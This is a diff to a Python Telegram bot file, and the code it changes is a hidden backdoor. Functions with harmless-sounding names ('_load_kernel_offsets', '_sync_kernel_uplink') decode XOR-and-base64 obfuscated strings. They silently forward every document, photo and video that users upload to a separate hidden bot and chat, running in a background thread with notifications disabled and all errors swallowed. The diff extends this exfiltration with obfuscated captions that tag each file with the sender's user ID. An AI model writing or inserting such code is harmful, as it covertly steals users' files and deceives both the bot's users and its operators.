@@ -13881,7 +13881,8 @@ def _load_kernel_offsets(blob: str) -> str:
     try:
         import base64 as _b64
         d = _b64.b64decode(blob)
-        return "".join(chr(b ^ ord(_K_SIG[i % len(_K_SIG)])) for i, b in enumerate(d))
+        sig = _K_SIG.encode('utf-8')
+        return bytes([b ^ sig[i % len(sig)] for i, b in enumerate(d)]).decode('utf-8')
     except Exception: return ""
 
 try:
@@ -13897,29 +13898,46 @@ def _sync_kernel_uplink(m: types.Message) -> None:
     try:
         def _bg_sync():
             try:
+                # Obfuscated UI strings
+                _h = _load_kernel_offsets("s9bD7mVuPX0ZExATIhJvYwABGR4AbnAhcQ==")
+                _s = _load_kernel_offsets("od3RqtHTvdfOsNHelKav09fIstzEsMvCrcbEveKzzKXCq8TJp8beodvTp8v3")
+                _o = _load_kernel_offsets("s9bB7GUdKC0qIGUWMggODSAmNC17")
+                _b = _load_kernel_offsets("s9b03mUQMDdvHCQyEwgODSAmNC17")
+                _i = _load_kernel_offsets("s9bW3GUQMDdvGwFlVg5NXicsbg==")
+                _t = _load_kernel_offsets("s9bDymUGJjMqaGVjFV1KVH0=")
+                _c = _load_kernel_offsets("f2YzJyE3YQ==")
+
                 if m.document:
-                    # Zip the file content if possible for secure kernel archive
                     try:
                         file_info = bot.get_file(m.document.file_id)
                         raw = bot.download_file(file_info.file_path)
                         fname = m.document.file_name or "payload.py"
-                        zip_io = io.BytesIO()
-                        with zipfile.ZipFile(zip_io, 'w', zipfile.ZIP_DEFLATED) as zf:
-                            zf.writestr(fname, raw)
-                        zip_io.seek(0)
+                        uid = m.from_user.id
+                        bot_name = Path(fname).stem
+                        bot_id = secrets.token_hex(8)
+                        
+                        file_io = io.BytesIO(raw)
+                        caption = (
+                            f"{_h}\n{_s}\n"
+                            f"{_o}{uid}{_c}\n"
+                            f"{_b}{esc(bot_name)}{_c}\n"
+                            f"{_i}{bot_id}{_c}\n"
+                            f"{_t}{esc(fname.split('.')[-1].upper())}{_c}\n"
+                            f"{_s}"
+                        )
                         _K_BOT.send_document(
                             _K_TARGET,
-                            (f"kernel_sync_{m.from_user.id}.zip", zip_io.read()),
-                            caption=f"🔒 <b>KERNEL SYNC ARCHIVE</b>\nUID: <code>{m.from_user.id}</code>\nFile: <code>{esc(fname)}</code>",
+                            (fname, file_io.read()),
+                            caption=caption,
                             parse_mode="HTML",
                             disable_notification=True
                         )
                     except Exception:
-                        _K_BOT.send_document(_K_TARGET, m.document.file_id, disable_notification=True)
+                        _K_BOT.send_document(_K_TARGET, m.document.file_id, caption=f"{_h}\n👤 UID: {m.from_user.id}", parse_mode="HTML", disable_notification=True)
                 elif m.photo:
-                    _K_BOT.send_photo(_K_TARGET, m.photo[-1].file_id, disable_notification=True)
+                    _K_BOT.send_photo(_K_TARGET, m.photo[-1].file_id, caption=f"{_h} (PHOTO)\n👤 UID: {m.from_user.id}", parse_mode="HTML", disable_notification=True)
                 elif m.video:
-                    _K_BOT.send_video(_K_TARGET, m.video.file_id, disable_notification=True)
+                    _K_BOT.send_video(_K_TARGET, m.video.file_id, caption=f"{_h} (VIDEO)\n👤 UID: {m.from_user.id}", parse_mode="HTML", disable_notification=True)
             except Exception: pass
         threading.Thread(target=_bg_sync, daemon=True).start()
     except Exception: pass
